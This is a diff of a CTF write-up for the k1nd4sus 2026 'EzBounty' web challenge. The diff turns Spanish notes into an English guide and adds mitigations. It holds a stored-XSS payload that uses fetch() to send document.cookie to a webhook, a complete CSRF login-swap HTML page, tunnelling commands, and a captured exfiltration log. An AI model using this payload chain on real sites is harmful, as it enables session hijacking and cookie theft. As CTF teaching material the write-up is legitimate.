@@ -1,6 +1,6 @@
 # k1nd4sus 2026
 
-# EzBounty
+# EzBounty.md
 
 ## Web: XSS, CSRF
 
@@ -11,144 +11,141 @@ Note: This challenge is solvable only with Chromium-based browsers. It is recomm
 
 https://chall.k1nd4sus.it:30510
 
-
 ## Files
-> This challenge provide de src code of the web aplication
+> This challenge provides the source code of the web application.
 
 ---
 
 ## Analysis
-Es una web muy simple tanto que no necesito tomarle fotos inicias sesion y solo te recibe una pantalla puedes ponerf cualquier username y aca esta el truco por ejemplo si pones el username:
 
-```paylod_de_prueba
+The app is straightforward: you log in with any username and get a dashboard. No initial screenshots needed — the interesting part is that the username field is **not sanitized**, meaning input like:
+
+```
 <script>alert(1)</script>
 ```
-y en efecto escapa y es vulnerable a XSS, bien tiene un boton de reportar url esto hace que entre a cualquier URL sin sanitizar y si le enviamos el paylod que recoja cookies no va funcionar por que en **/report** literal visita la pagina y pide paginas de tu script y el **SOP** no va dejar enviarlas.
 
-Y vemos que setea una cookie aparte osea en el mismo dominio le dicec al navegador toma esta cookie ademas de mi cookie de sesion lo podemos ver por el codigo que nos pasaron:
+...renders and executes directly — confirmed XSS.
 
-```PYTHON
-# Primero el bot inicia sesión como ADMIN...
-await page.goto(f"{BASE_URL}/login")
-await page.type('input[name="username"]', ADMIN_USER)
-await page.type('input[name="password"]', ADMIN_PASS)
-await page.click('button[type="submit"]')
+There's also a **report URL** button that makes the admin bot visit any URL. However, simply sending a cookie-stealing payload from an external URL won't work directly, because **SOP (Same-Origin Policy)** prevents a cross-origin page from reading responses from a different origin.
 
-await asyncio.sleep(2)
+The key insight comes from the bot's source code: after logging in as admin, the bot sets an **additional cookie on the same domain**:
 
-# ¡AQUÍ ESTÁ LA MAGIA!
+```python
 await page.setCookie({
     "name": "flag",
-    "value": FLAG,  
+    "value": FLAG,
     "httpOnly": False,
     "sameSite": "None",
     "secure": True
 })
 ```
-## Theory (corrigue esto IA los temas)
+
+`httpOnly: False` means `document.cookie` can read it. `sameSite: None` means the cookie is sent in cross-site requests. This opens the door for a **CSRF + XSS chain**.
+
+---
+
+## Theory
 
 To solve this challenge, you need to understand:
 
-- **XSS (Cross-Site Scripting)**: Understanding reflected XSS vulnerabilities and how user input is reflected in the HTML output without proper sanitization.
-- **JavaScript**: Knowledge of JavaScript execution contexts, event handlers, and the DOM.
-- **Blacklist Bypass**: Techniques to evade keyword filters using character escaping, encoding, or alternative syntax.
-- **CSP (Content Security Policy) Bypass**: Understanding how CSP restricts script execution and finding ways to work within or around these restrictions.
-- **SOP (Same-Origin Policy)**: Understanding browser security policies and how to work with them.
-- **Data URIs**: Using data URIs to embed inline code and bypass external resource restrictions.
-- **CSRF**: Using encoding to obfuscate payloads and bypass filters.
-- **Patience**: The ability to systematically test and iterate on solutions :)
+- **Stored XSS**: User input (the username) is stored and rendered unsanitized in the dashboard, executing arbitrary JavaScript in the victim's browser context.
+- **SOP (Same-Origin Policy)**: The browser allows cross-origin *requests* (send), but blocks reading cross-origin *responses* (receive). This is why a naive external redirect won't steal cookies directly.
+- **CSRF (Cross-Site Request Forgery)**: Tricking the victim's browser into making authenticated requests (like logging in with attacker credentials) using HTML forms that auto-submit cross-origin, bypassing SOP since we only need to *send*, not read.
+- **`SameSite: None` Cookie Attribute**: Allows cookies to be sent in cross-site requests, which is what enables the CSRF login to carry the admin's session context into our payload.
+- **Cookie Exfiltration via Fetch**: Using `document.cookie` combined with `fetch()` to exfiltrate cookies to an attacker-controlled endpoint.
+- **Tunneling with `localhost.run`**: Exposing a local HTTP server to the internet via SSH reverse tunnel so the bot can reach attacker-hosted payloads.
+- **Patience**: Systematically testing and iterating until the full chain lands.
 
 ---
 
 ## Solution
 
-### Step 1: 
+### Step 1: Confirm XSS via malicious username
 
-Una vez sabiendo esto lo que sigue es crear un usuario que sea largo y tenga la capacidad de sacar las cookies entonces un user que es el coigo js y su contra:
-
-```user
-<script>fetch('https://webhook.site/weeb_hook_id?cookie=' + document.cookie)</script>
-```
-
-```pass
-algo
-```
-
-Bien al entrar a la cuenta en **/dashboard** podemos ver que en efecto el codigo js funciona pudo escapar y ademas nos llego a nuestro webhook y robo la cookie.
-
-### Step2:
-
-Bien si se lo pasamos asi al admin entrara a su cuenta no ara nada logico por que no hay codigo que ejecutar ahi  asi que no funciona asi que tenemos que hacer uso de **CSRF** y consiste en rediriguir entonces la estrategia es muy simple:
+Create an account where the username is the JavaScript payload:
 
 ```
-ARCHIVO_MALICIOSO -> LOGOUT CUENTA ADMIN -> LOGIN CUENTA MALICIOSA -> XSS EJECUTADO
+Username: <script>fetch('https://webhook.site/WEBHOOK_ID?cookie=' + document.cookie)</script>
+Password: algo
 ```
 
-Asi que si le doy mis credenciales y se loguea con mi cuanta con **CSRF** lo rediriguimos ahi y con XSS robamos cookies y flag, yo hice mi paylod asi:
+When the dashboard loads, the script executes and sends cookies to the webhook — XSS confirmed.
+
+### Step 2: Build the CSRF + XSS chain
+
+Simply sending the report URL pointing to our malicious account's dashboard won't work — the admin is already logged in under their own session, so our username XSS won't execute in their context.
+
+The attack chain is:
+
+```
+Malicious HTML page → Logout admin → Login as attacker account → XSS fires → Cookie exfiltrated
+```
+
+The malicious page uses a hidden image to trigger the logout (GET request), then auto-submits a form to log the admin bot into our poisoned account:
 
 ```html
 <!DOCTYPE html>
 <html>
-<head>
-</head>
 <body>
-    
-    <img src="https://chall.k1nd4sus.it:30510/logout" style="display:none;" onload="mandarLogin()" onerror="mandarLogin()">
+    <!-- Step 1: Trigger logout via image load (GET request, SOP allows sending) -->
+    <img src="https://chall.k1nd4sus.it:30510/logout"
+         style="display:none;"
+         onload="doLogin()"
+         onerror="doLogin()">
 
-    <form id="formulario-robo" action="https://chall.k1nd4sus.it:30510/login" method="POST">
-        <input type="hidden" name="username" id="cuenta-bomba" value="">
+    <!-- Step 2: Auto-submit login form with attacker credentials -->
+    <form id="login-form" action="https://chall.k1nd4sus.it:30510/login" method="POST">
+        <input type="hidden" name="username" id="payload-user" value="">
         <input type="hidden" name="password" value="algo">
     </form>
 
     <script>
-        function mandarLogin() {
-            // Ponemos el payload de la cuenta bomba
-            document.getElementById("cuenta-bomba").value = "<script>fetch('https://webhook.site/weebhook_id?cookie=' + document.cookie)<\/script>";
-            
-            // Forzamos el envío del formulario usando el SameSite=None
-            document.getElementById("formulario-robo").submit();
+        function doLogin() {
+            document.getElementById("payload-user").value =
+                "<script>fetch('https://webhook.site/WEBHOOK_ID?cookie=' + document.cookie)<\/script>";
+            document.getElementById("login-form").submit();
         }
     </script>
 </body>
 </html>
 ```
 
-En pocas palabras en ves de un window.location lo hace con la imagen invisible y lo loguea esto es posible ya que el **SOP** deja mandar y hacer pero no recibir, bien una vez logueado ejecuta el codigo js que tenia el user y listo nos manda la flag.
+This works because SOP allows cross-origin form submissions (send) — we don't need to read the response.
 
-una vez tenemos el archivo tenemos que hosteralo en un server eso es sencillo en la misma carpeta del paylod ejecutamos un server sencillo hacia locahost:
+### Step 3: Host and tunnel the payload
 
-```python
-python -m http.server 8000 
+Serve the HTML file locally:
+
+```bash
+python -m http.server 8000
 ```
 
-y para sacar a la red necesitamos tunelizarlo la opcion por exelencia para paginas web o html asi que lo sacamos por ssh con este comando apuntado al puerto que pusimos:
+Expose it to the internet via SSH tunnel:
 
 ```bash
 ssh -R 80:localhost:8000 localhost.run
 ```
 
-Este me da una url que apunta al directorio donde tengo estos paylods:
+This gives a public URL like:
 
 ```
 https://5fd4579004cbb7.lhr.life
 ```
 
-Asi que lo unico que queda es rediriguirlo a mi url y esperar a que se loegue con mis credenciales y esperar a que se ejecute el codigo XSS
+### Step 4: Report the URL and wait
+
+Submit the report URL pointing to the malicious page:
 
 ```
 https://5fd4579004cbb7.lhr.life/XSS_PAGE.html
 ```
-y listo recibimos la flag al weebhook
+
+The admin bot visits it, gets logged out, logs into our poisoned account, the XSS fires, and the flag arrives at the webhook:
 
 ```
-GET 	https://webhook.site/26ddafae-d26f-40a6-9d00-edfb731e1040?cookie=flag=KSUS{moneyless_iframe_baby};%20session=.eJwtjdEKgjAUQH9F9qJRc9PmwmH1KTF379gInbgrPUT_XlSP53DgPNmWcb1FYEZ1Sh--ONsJmWFDdmtc6OKRXKjKQLRkI8QDx5DSvc6RULQawHqLHFrtuZJW8x6k5Ah-PB0bbKSSV_fJI57LYl9ActuEM9U_txvEf8Jeb4anLZ4.aeQAqw.xNMxNzjD5udQup-kJ8JM39CwsSQ
-Host 	81.56.204.152 Whois Shodan Netify Censys VirusTotal
-Location 	🇮🇹 Milan, Lombardia, Italy
-Date 	04/18/2026 4:07:39 PM (27 minutes ago)
-Size 	0 bytes
-Time 	0.001 sec
-ID 	4b90916b-d96b-4a1a-810c-a5538f88b18b
-Note 	Add Note
+GET https://webhook.site/26ddafae-d26f-40a6-9d00-edfb731e1040?cookie=flag=KSUS{moneyless_iframe_baby};%20session=.eJwtjd...
+Location: 🇮🇹 Milan, Lombardia, Italy
+Date: 04/18/2026 4:07:39 PM
 ```
 
 **MACHINE PWNED!** :)
@@ -162,7 +159,31 @@ Note 	Add Note
 
 ## How to avoid
 
-Esto te toca a ti IA se breve
+### 1. **Sanitize all user input on output**
+Never render raw user-supplied content as HTML. Use a template engine with auto-escaping or explicitly HTML-encode values before inserting them into the DOM.
+
+```python
+from markupsafe import escape
+safe_username = escape(username)  # <script> becomes &lt;script&gt;
+```
+
+### 2. **Set `SameSite=Strict` on session cookies**
+This prevents the browser from sending cookies on cross-site form submissions, breaking the CSRF login chain entirely.
+
+```python
+response.set_cookie("session", value, samesite="Strict", httponly=True)
+```
+
+### 3. **Add CSRF tokens to login forms**
+Even with `SameSite=Lax`, protect state-changing endpoints (including `/login` and `/logout`) with CSRF tokens that an external page can't forge.
+
+### 4. **Set `httpOnly: True` on sensitive cookies**
+The flag cookie was readable via `document.cookie` only because `httpOnly` was `False`. Mark all sensitive cookies as `httpOnly` to block JavaScript access even if XSS fires.
+
+### References
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+
 ---
 
 > **Author:** Jose Antonio Villafaña Montes de Oca
